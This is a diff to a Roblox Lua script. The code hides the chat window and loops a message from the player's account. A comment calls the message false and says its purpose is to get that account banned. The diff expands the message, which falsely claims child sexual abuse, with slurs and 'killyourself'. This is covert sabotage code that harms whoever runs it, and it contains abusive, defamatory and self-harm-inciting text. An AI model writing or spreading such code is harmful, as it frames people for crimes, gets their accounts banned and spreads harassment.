@@ -868,7 +868,7 @@ if game:GetService("CoreGui").ExperienceChat:FindFirstChild("bubbleChat",true) t
 game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
 while _G. on == true do
 local ts = game:GetService("TextChatService")
-ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i fuck children and i love little kids") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
+ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i fuck children and i love little kids i love fucking big femboys fuck you killyourself bitch whore slut") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
 wait()
 end
 
@@ -878,7 +878,7 @@ if game:GetService("CoreGui").ExperienceChat:FindFirstChild("bubbleChat",true) t
 game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
 while _G. on == true do
 local ts = game:GetService("TextChatService")
-ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i fuck children and i love little kids") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
+ts.ChatInputBarConfiguration.TargetTextChannel:SendAsync("i fuck children and i love little kids i love fucking big femboys fuck you killyourself bitch whore slut") --THIS IS TO SIMPLY GET THEIR ACCOUNT BANNED,THIS IS FALSE.
 wait()
 end
 
